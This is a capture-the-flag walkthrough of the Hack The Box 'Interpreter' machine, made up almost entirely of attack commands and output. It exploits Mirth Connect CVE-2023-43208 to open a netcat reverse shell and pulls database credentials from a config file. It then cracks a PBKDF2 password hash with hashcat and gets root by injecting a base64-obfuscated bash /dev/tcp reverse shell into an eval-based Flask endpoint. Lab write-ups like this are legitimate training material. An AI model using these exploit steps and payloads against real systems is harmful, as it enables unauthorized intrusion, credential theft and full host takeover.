# HTB-interpreter

We will begin this machine by using Nmap to scan the server for all open TCP ports, service versions and perform script scanning:

```bash
nmap -p0-65535 -sCV 10.129.89.231
```
### Results

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp   open  http     Jetty
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
443/tcp  open  ssl/http Jetty
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
|_ssl-date: TLS randomness does not represent time
6661/tcp open  unknown

```

## User -> Mirth

Visiting the webserver on port 443, we find a Mirth Connect instance.  Clicking the Launch Mirth Connect Administrator initiates a download of the file webstart.jnlp.

<img src="Images/03-Landing-Page.png" width="600">

Viewing webstart.jnlp using vim, reveals that we are working with Mirth Connect Administrator 4.4.0:
 
```jnlp
<jnlp codebase="http://10.129.89.231:80" version="4.4.0">
    	
    <information>
        		
        <title>Mirth Connect Administrator 4.4.0</title>
```

Searching for exploits related to this version of Mirth Connect returns the following exploit, found here:

<img src="Images/05-Google-Search.png" width="600">
https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc

Preparing and executing the payload provides us with a shell on the server:

#### Start a listener:

```
nc -lvnp 4444
```

#### Download the exploit:

```
git clone https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc
```

#### Execute the exploit:
```
python3 CVE-2023-43208.py -u https://10.129.89.231/ -c 'busybox nc 10.10.14.16 4444 -e /bin/bash'
```

#### Output:
```
Listening on 0.0.0.0 4444
Connection received on 10.129.89.231 57956
id
uid=103(mirth) gid=111(mirth) groups=111(mirth)
```

We then use the following commands to stabilize the shell:

```bash
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
export TERM=xterm
ctrl-z
stty raw -echo; fg
```

## Mirth -> Sedric

At this point we want to identify any related files of interest for the underlying Mirth Connect technology. After some research we discover the following file which contains database credentials:

#### Extract creds with grep:

```
grep -i  'url\|user\|pass' /usr/local/mirthconnect/conf/mirth.properties
```

#### Output:

```
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
```

Using SS, we discover that there is a running SQL server on port 3306:

#### Execute SS:

```
ss -ltnp
```

#### Output:

```
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                          
LISTEN 0      50           0.0.0.0:80         0.0.0.0:*    users:(("java",pid=3524,fd=327))
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                    
LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*                                    
LISTEN 0      50           0.0.0.0:443        0.0.0.0:*    users:(("java",pid=3524,fd=331))
LISTEN 0      128        127.0.0.1:54321      0.0.0.0:*                                    
LISTEN 0      256          0.0.0.0:6661       0.0.0.0:*    users:(("java",pid=3524,fd=335))
LISTEN 0      128             [::]:22            [::]:* 
```

With this information, we connect to the SQL server using MariaDB and discover an encrypted password:

#### Connecting to database:

We use the password: MirthPass123!

```bash
mariadb -h localhost -P 3306 -u mirthdb -p mc_bdd_prod
```

```bash
show databases;
use mc_bdd_prod;
show tables;
```

#### Output:

```
+-----------------------+
| Tables_in_mc_bdd_prod |
+-----------------------+
| ALERT                 |
| CHANNEL               |
| CHANNEL_GROUP         |
| CODE_TEMPLATE         |
| CODE_TEMPLATE_LIBRARY |
| CONFIGURATION         |
| DEBUGGER_USAGE        |
| D_CHANNELS            |
| D_M1                  |
| D_MA1                 |
| D_MC1                 |
| D_MCM1                |
| D_MM1                 |
| D_MS1                 |
| D_MSQ1                |
| EVENT                 |
| PERSON                |
| PERSON_PASSWORD       |
| PERSON_PREFERENCE     |
| SCHEMA_INFO           |
| SCRIPT                |
+-----------------------+
```

#### Password extraction:

```bash
select * from PERSON_PASSWORD;
```

#### Output:

```
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
```

Using AI to research the encrypted password, we discover that it uses the PBKDF2-HMAC-SHA256 algorithm:

```
This exact hash (u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==) is from Mirth Connect 4.4.0 and uses PBKDF2-HMAC-SHA256 with 600,000 iterations and an 8-byte salt. The stored value is just Base64(8-byte-salt ‖ 32-byte-derived-key) — there's no separate salt column.
```

We can recover the plaintext value by splitting the ciphertext into a base64 salt and a base64 hash:

```
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | head -c8  | base64 -w0 > salt.txt
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | tail -c32 | base64 -w0 > hash.txt
```

Next, we create the final hash:

```
echo "sha256:600000:$(cat salt.txt):$(cat hash.txt)" > mirth.hash
```

#### Cracking hash using mode 10900:

```
hashcat -m 10900 -a 0 mirth.hash /usr/share/wordlists/rockyou.txt -w 3
```

This eventually identifies the plaintext: snowflake1.

#### Output:

```
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
```

With this, we can now use SSH to log into the system as the Sedric user using the password: snowflake1

```
ssh sedric@10.129.89.231
```

## Sedric -> Root

After some enumeration, we decide to list the current root processes and discover the **notif.py** program is running:

#### Listing processes

```
ps aux | grep root
```

#### Output:

```
root           1  0.0  0.3 167548 12080 ?        Ss   06:04   0:00 /sbin/init
root           2  0.0  0.0      0     0 ?        S    06:04   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   06:04   0:00 [rcu_gp]
[...]
root        3509  0.0  0.2  40776 11444 ?        S    06:05   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
root        3536  0.0  0.7  39872 31148 ?        Ss   06:05   0:01 /usr/bin/python3 /usr/local/bin/notif.py
root        3919  0.0  0.0      0     0 ?        I    06:29   0:00 [kworker/u4:0-events_unbound]

```

Reading the contents of this file, reveals an application running locally on port 54321:

```
cat /usr/local/bin/notif.py
```

#### Output:

```
if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```

We will therefore port forward to access the application locally:

```
ssh sedric@10.129.89.231 -L 54321:127.0.0.1:54321
```

Taking a closer look at notif.py, we discover that the application is using eval:

```
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"
```

Eval is dangerous because it executes strings as if they are programming code. Leveraging this, we can craft some exploit code, possibly using AI, to exploit this script and elevate ourselves to the root user. First, we will test our hypothesis to see if we can actually execute Python code:

#### Request attempt 1:

```
curl -s -X POST http://127.0.0.1:54321/addPatient \
  -H "Content-Type: application/xml" \
  --data-binary "<patient>
    <firstname>{__import__('os').getcwd()}</firstname>
    <lastname>b</lastname>
    <sender_app>a</sender_app>
    <timestamp>x</timestamp>
    <birth_date>01/01/2000</birth_date>
    <gender>M</gender>
  </patient>"
```

This proves successful, however, regex is preventing us from entering certain characters, including a space. This prevents us from executing a reverse shell:

#### Example:

```
curl -s -X POST http://127.0.0.1:54321/addPatient   -H "Content-Type: application/xml"   --data-binary "<patient>
    <firstname>{__import__('os').system(\"busybox nc 10.10.14.16 4444 -e /bin/bash\")}</firstname>
    <lastname>b</lastname>
    <sender_app>a</sender_app>
    <timestamp>x</timestamp>
    <birth_date>01/01/2000</birth_date>
    <gender>M</gender>
  </patient>"
```

#### Example output:

```
[INVALID_INPUT]
```

A solution here is to use a Base64 encoded payload and then decode and execute the contents in the code block:

#### Start a listener:

```
nc -lvnp 4444
```

#### Base64 encode a reverse shell:

```
echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'" | base64 -w0
```

#### Output:

```
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQ0IDA+JjEn
```

#### Execute the payload:

```
curl -X POST http://127.0.0.1:54321/addPatient   -H "Content-Type: application/xml"   --data '<patient>
    <firstname>{__import__("os").system(__import__("base64").b64decode("YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQ0IDA+JjEn").decode())}</firstname>
    <lastname>b</lastname>
    <sender_app>a</sender_app>
    <timestamp>x</timestamp>
    <birth_date>01/01/2000</birth_date>
    <gender>M</gender>
</patient>'
```

The code successfully executes and we catch a root shell on our listener:

#### Output:

```
Listening on 0.0.0.0 4444
Connection received on 10.129.89.231 59198
bash: cannot set terminal process group (3536): Inappropriate ioctl for device
bash: no job control in this shell
root@interpreter:/usr/local/bin# 
```
